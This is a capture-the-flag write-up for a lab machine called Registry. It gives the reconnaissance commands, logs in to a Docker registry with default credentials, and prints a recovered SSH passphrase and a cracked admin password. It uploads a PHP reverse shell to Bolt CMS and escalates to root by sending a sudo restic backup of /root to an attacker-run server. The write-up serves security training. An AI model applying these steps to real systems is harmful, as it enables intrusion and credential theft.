    4.1 [From bolt user to www-data user.](#from-bolt-to-www-root)

    4.2 [from ww-data user to root.](#elevate-priv-from-www-data-to-root)

### **Summary**

1- A **registry docker API** with weak creds contained **one docker image** .

2- After downloading the image you will find **a privae SSH key and its passphrase for bolt user**.

3- we assumed that **www-data** user can run a binary as root user.

4- enumerating the files you will find the **DB** of the web application running on port 80, **contains the admin user hash password**.

5- There is a **bolt CMS** running on port 80. using the creds found from the DB you can succssefully log-in to the dashboard.

6- the dashboard supports **uploading file**, so we edit the configuration file to allow **uploading PHP files**.

7- upload a shell that connects back to the machine,so we get a shell as **www-data** user.

8- **www-data** user can backup folders as root user.

9- we setup a **repo** and **REST server** on the machine and **backup-ed** the **/root/** folder to our server.

10- **restored** the backup and found the **SSH private key of root user**.

11- SSH-ed into the machine as **root user**.

### Reconnaissance

First we fire Nmap against the machine IP, doing a full-port TCP scan and service, OS detection then saving the output to a file *full-scan*

PS: Doing a full-port scan takes more time than normal scan does, but ensures that you don't miss anything.

    nmap -p- -A -T 4 -v -oA full-scan 10.10.10.159

From the output, we extracted some information.

1. The host is running on **Linux**.
2. 4 ports are opened **22**,**80**,**443.**
3. There is a web application running on port **80 ( registry.htb** **)**
4. port **443** is hosting a subdomain called **docker.registry.htb**

we should add **registry.htb** & **docker.registry.htb** to our hosts list 

    sudo nano /etc/hosts
    10.10.10.159     **registry.htb**  **docker**.**registry.htb**

I always start with web based ports because most of the time they are higher risk than other services.

### **Scanning r**egistry.htb

Port 80 main page:

![/images/Registry/register-htb-80.png](/images/Registry/register-htb-80.png)

It is just the nginx default page. Nothing interesting here so we start directory brute-forcing using gobuster.

    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://**registry.htb**/ -t 20

leaving gobuster running, we start scanning **docker**.**registry.htb.**

### Scanning **docker**.**registry.htb**

the main page of the **docker**.**registry.htb** is blank**.** so we should run gobuster

    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://docker.registry.htb/ -t 20 -k

after seconds we found **/v2/** which is an API that requires authentication so we try the old school username & password  **admin:admin** and we logged-in successfully.

from the subdomain name and the name of the box that API must be **docker registry API,** the API is used to manage docker images. so we will try to :

1- list all docker images that exists.

    https://docker.registry.htb/v2/_catalog  # this will request the API to list all docker image
    
    {"repositories":["bolt-image"]}

so we have only 1 image called **bolt-image**

2- list all tags for the docker image.

    http://docker.registry.htb/v2/bolt-image/tags/list  # list al tags for the image "bolt-image"
    
    {"name":"bolt-image","tags":["latest"]}

the **"bolt-image"** has only 1 tag **"latest"**

3- download all blobs for **latest** tag.

    https://docker.registry.htb/v2/bolt-image/manifests/latest  # list all blobs so we can download them

          }
       ],
          ...

this is the blobs list for the **latest** tag, Now we should download all these blobs.

You can download all the blobs using the **blobs** endpoint

    https://docker.registry.htb/v2/bolt-image/blobs/BLOB_SUM # repeat this request for every blob you want to download 

You should now have a gzip file for every blob you downlaod, decompress them and extract any valuable information.

**Here is a [script](https://github.com/NotSoSecure/docker_fetch/) that automates this process .**

### Gaining Access

from the blobs you should find:

- A **passphrase for SSH key** from blob 1

```
    #!/usr/bin/expect -f
    #eval `ssh-agent -s`
    spawn ssh-add /root/.ssh/id_rsa
    expect "Enter passphrase for /root/.ssh/id_rsa:"
    send "**GkOcz221Ftb3ugog**\n";
 ```

- **Config file** for **SSH** login from blob 1

    Host registry
    User bolt
    Port 22
    Hostname registry.htb

- **SSH key** from blob 4

so now we have a possible username & his private SSH key and its passphrase , It's time to put all things together 

    ssh -i id_rsa bolt@10.10.10.159
    Enter passphrase for key 'id_rsa': GkOcz221Ftb3ugog

![/images/Registry/bolt-user.png](/images/Registry/bolt-user.png)

Here is the user flag.

### Elevate privileges

### **From bolt to www-root**

after some enumeration we found a php file called backup.php that contains a php code that execute a  restic binary as root user. 

    <?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");

maybe the user who owns this directory also can run this binary as root , but who owns /var/www/ ? **www-data**  so we need to get a shell as www-data

after exploring the web files , you will find **bolt.db** in **/var/www/html/bolt/app/database** which is a **sqlite DB**, so we should transfer it to our box so we can what it contains.

Since we inside the docker we should use scp to transfer files from/to the machine through **SSH,**

    scp -i id_rsa bolt@10.10.10.159:**/var/www/html/bolt/app/database/bolt.db** 
    Enter passphrase for key 'id_rsa'**: GkOcz221Ftb3ugog**

![/images//images/Registry/sqlite.png](/images/Registry/sqlite.png)

the **DB** has table called **bolt_users which has a hash of admin passowrd ,** using **john** to decrypt the has we got the password which is **strawberry.**

But where should we use this passowrd ? Ah I forgot that my **gobuster** is still running on **register.htb**

the gobuster has found  **/bolt/** directory

**Bolt** is an open source **CMS** based on **PHP ,** 

    http://10.10.10.159/bolt/bolt/login # bolt login page

we enter the creds we got from the db **admin**:**strawberry ,** then we accessed the dashboard successfully.

![/images/Registry/dashboard.png](/images/Registry/dashboard.png)

the CMS allow to **upload files**, but the file's extention must be listed in the **configuration file** allowed extensions so we:

1- add **php extension** as allowed extension to the **configuration file**.

2- upload a  **shell** then execute it so we get a shell as **www-data** 

**PS: setup a listener on the machine then modify your shell to connect to this port on the machine since we are dealing with docker, or you can chisel to do tunneling.**

tried to do those steps, after adding the php extension to the **configuration file, the config file has been reverted to its orignal state** 

also tried to upload a normal image file, after 10 seconds the image has been deleted from the server.

so maybe there is a cron job running.

so the cron job does: 
1- copy a clean backup of the configuration file to the **bolt website** if the file is changed.

2- delete any new uploaded files.

so we need to do it fast or maybe writting a script will be much better. but I did it manually anyway.

![/images/Registry/restic.png](/images/Registry/restic.png)

so our assumption was true , **www-data** can run the rest binary as root user.

### **Elevate priv from www-data to Root.**

Restic is a backup program that supports backup folders to a remote server via HTTP/HTTPS but  you must first set up a remote REST server instance.

so we are going to:

1- setup a REST server locally and build a repo so we can backup to.

the documentation page suggested to use [THIS REST server](https://github.com/restic/rest-server) , first we will compile the server on our machine then transfer it to the box through **SSH.**

    #on your machine
    git clone https://github.com/restic/rest-server
    cd rest-server
    make
    scp -i id_rsa rest-server bolt@10.10.10.159:/tmp
    Enter passphrase for key 'id_rsa': GkOcz221Ftb3ugog

now we should make a repo and start the server

    # on the box
    /usr/bin/restic init --repo root-backup/
    ./rest-server --path root-backup/ --no-auth

![/images/Registry/setup-repo.png](/images/Registry/setup-repo.png)

now our server is ready.

2- send a backup of root files/folder to our remote server

    www-data@bolt:/$ sudo /usr/bin/restic backup -r rest:http://localhost:8000/ /root/

![/images/Registry/backing.png](/images/Registry/backing.png)

we took a backup of **/root/** directory and send it to our local  server with snapshot number **6b33b704**

3- restore the backup then we will have access to all backup files

    bolt@bolt:/tmp$ restic -r /tmp/.not_hidden/root-backup/ restore 6b33b704 --target /tmp/             

we restored  **/roor-backup/ (**our repo name we initiated at the first step)  **content to /tmp/ directory**  

![/images/Registry/root-content.png](/images/Registry/root-content.png)

here is our **/root/** folder, notice that there is .ssh folder that contains root user private SSH Key

copy the SSH key to you machine then connect to the box as root user.

![/images/Registry/root.png](/images/Registry/root.png)

**And Rooted #**
